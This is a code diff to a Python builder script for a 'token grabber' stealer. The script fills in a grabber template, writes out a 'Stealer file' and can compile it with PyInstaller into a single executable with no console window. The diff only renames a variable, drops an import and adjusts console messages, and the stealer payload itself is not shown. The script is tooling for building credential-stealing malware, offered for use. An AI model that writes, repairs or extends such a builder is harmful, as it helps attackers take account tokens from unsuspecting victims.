@@ -1,5 +1,4 @@
 import os
-import shutil
 import sys
 from colorama import Fore, init, Style
 
@@ -46,18 +45,18 @@ with open(grabber_path, 'r', encoding="utf-8") as f:
 
 code = code.replace(search_text, replace_text)
 
-with open(output_grabber_path, 'w', encoding="utf-8") as output_grabber_path:
-    output_grabber_path.write(code)
+with open(output_grabber_path, 'w', encoding="utf-8") as output_grabber:
+    output_grabber.write(code)
 
 print(f"[{Fore.CYAN}!{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Stealer file: {Fore.RED}{output_grabber_path}{Style.RESET_ALL}")
 
 compile_to_exe = input(f"\n[{Fore.CYAN}?{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Do you want to compile to .exe? (y/n): ").lower()
 
 if compile_to_exe == "y":
+    print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Compiling to .exe...")
     os.system(f'pyinstaller --onefile --noconsole "{output_grabber_path}"')
+
     exe_path = f"dist/{name_file}.exe"
-    clear()
-    print(Fore.GREEN + logo)
     print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Compiled .exe file: {Fore.RED}{exe_path}{Style.RESET_ALL}")
 
 print(f"\n[{Fore.CYAN}✔{Style.RESET_ALL}] {Fore.CYAN}➤{Style.RESET_ALL} Finished creating the token grabber script!")
